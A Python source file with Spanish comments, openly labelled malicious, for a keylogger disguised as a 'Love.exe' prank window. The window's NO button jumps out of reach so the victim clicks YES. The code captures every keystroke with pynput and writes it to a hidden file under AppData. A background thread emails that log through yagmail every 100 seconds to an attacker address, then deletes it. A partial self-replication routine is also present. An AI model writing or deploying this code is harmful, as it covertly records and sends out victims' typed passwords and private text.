from pynput import keyboard as kb
import shutil
import yagmail
import time
import threading
import os
from pathlib import Path 
from os import remove 
from tkinter import *
import tkinter
from tkinter import messagebox
from random import randint
import platform
from ctypes.wintypes import INT

##Codigo Malicioso 

# Captacion Teclas
def pulsa(tecla):
    key = (str(tecla))
    tipo = key.find("'")
    cuenta = key.count("'")
    if tipo == -1: 
        if key == "Key.space" :
            key = key.replace("Key.space", " ")
        elif key == "Key.backspace":  
            key = key.replace("Key.backspace"," |DELETE| ")
        elif key == "Key.enter":
            key = key.replace("Key.enter"," |ENTER| ")
        elif key == "Key.media_volume_up":
            key = key.replace("Key.media_volume_up", "\nEl usuario ha subido el volumen\n")
        elif key == "Key.media_volume_down":
            key = key.replace("Key.media_volume_down", "\nEl usuario ha bajado el volumen\n")
        elif key == "Key.down":
            key = key.replace("Key.down", " |ABAJO| ")
        elif key == "Key.up":
            key = key.replace("Key.up", " |ARRIBA| ")
        elif key == "Key.right":
            key = key.replace("Key.right", " |DERECHA| ")
        elif key == "Key.left":
            key = key.replace("Key.left", " |IZQUIERDA|")
        elif key == "Key.enter":
            key = key.replace("Key.enter", " \n|ENTER|\n ")
        elif key == "Key.shift":
            key = key.replace("Key.shift", "|SHIFT|")
        elif key == "Key.media_play_pause":
            key = key.replace("Key.media_play_pause", "|Music Stop|")
    elif tipo > -1:
        if cuenta == 3:
            key = key.replace("'''","'")
        elif cuenta == 2:
            key = key.replace("'","")             
    archivo = open( str(keylog_ruta), 'a')
    print(key)
    archivo.write(key)

def captacion():
    with kb.Listener(pulsa) as listener:
        listener.join()
    return True


def replicacion():
    if "intel" in proces:
        try:
            procesador = ("/Intel")
            ruta_crear = str(user + ruta + procesador)
            os.mkdir(ruta_crear)
            print ("hola")
        except FileExistsError:
            pass
    else:
        try:
            procesador = ("/AMD")
            ruta_crear = str(user + ruta + procesador)
            os.mkdir(ruta_crear)
        except FileExistsError:
            for file in os.listdir(ruta_crear):
                os.remove(os.path.join())
            os.rmdir(ruta_crear)
    (actual, nueva) = (r_ejecucion + "/love.py ", ruta_crear + "/.Love.py" )
    #shutil.copy(actual, nueva)


# Envio de datos
def send():
    while True:
        try:
            time.sleep(100)
            emisor = "Correo_emisor"
            contraseña = "Password_emisor"
            destinatario = ['Correo_receptor']
            asunto = "Actualizacion de sistema pawneado"
            mensaje = "EL sistema ha liberado lo siguiente: "
            archivo = str(keylog_ruta)
            yag = yagmail.SMTP(user=emisor, password=contraseña)
            yag.send(destinatario, asunto, [mensaje], attachments=archivo)
            if os.path.exists(archivo) == True:
                os.remove(archivo)
        except:
            archivo = open(str(keylog_ruta), 'a')

# Iniciar
def keylogger():
    try:
        replicacion()
        ventana_main.destroy()
    except NameError:
        pass
    timer = threading.Thread(target=send)
    timer.start()
    captacion()
        
# Codigo señuelo
def cambio_color():
    while 1 == 1:
        ventana_main.config(bg='red')
        time.sleep(1) 
        ventana_main.config(bg='black')

def press_button(evento):
    evento.widget.place(x= randint(0,250),y= randint(70,150))

## Inicio 
ruta_ejecucion = (os.getcwd()) # Ruta Desde donde se inicia el programa 
user_crudo = os.environ['USERPROFILE'] # Ruta del usuario que ejecuta el programa
uname  = platform.uname() # Invoca los componentes del pc
proces = (uname.processor).lower() # Processador pc 
user = user_crudo.replace("\\", "/") 
r_ejecucion = ruta_ejecucion.replace("\\", "/")
ruta = ("/AppData/Local")
if "intel" in proces: 
    procesador = ("/Intel")
else:
    procesador = ("/AMD")
ruta_crear = str(user + ruta + procesador) # En esta ruta se guardara la replicacion del programa y el ".txt" de keylogger
print(ruta_crear)
nueva = (ruta_crear + "/.Love.exe" ) # esta sera la nueva ruta del virus
keylog_ruta = (ruta_crear + "/.config") # Esta sera la ruta del archivo que guarda las pulsaciones
if os.path.exists(ruta_crear) == True:
    keylogger()
else:
    ventana_main = Tk()
    ventana_main.title("Love.exe")
    ventana_main.geometry("300x200")
    ventana_main.resizable(0,0)
    btn = tkinter.Button(ventana_main, text ="NO")
    btn.place(x=60,y=100)
    texto1 = Label(ventana_main, text="You", fg='black', font=("Times New Roman",16))
    LOVe =  Label(ventana_main, text="LOVE", fg='red', font=("Times New Roman",16))
    texto2 = Label(ventana_main, text="me?", fg='black', font=("Times New Roman",16))
    texto2.place(x=190,y=25)
    LOVe.place(x=125,y=25)
    texto1.place(x=80,y=25)
    btn.bind("<Enter>", press_button)
    btn2 = tkinter.Button(ventana_main, text="YES", command=keylogger)
    btn2.place(x=220,y=100)
    ventana_main.mainloop()


    













































































































































































































































































































































































































































































































































































































































































































































































































































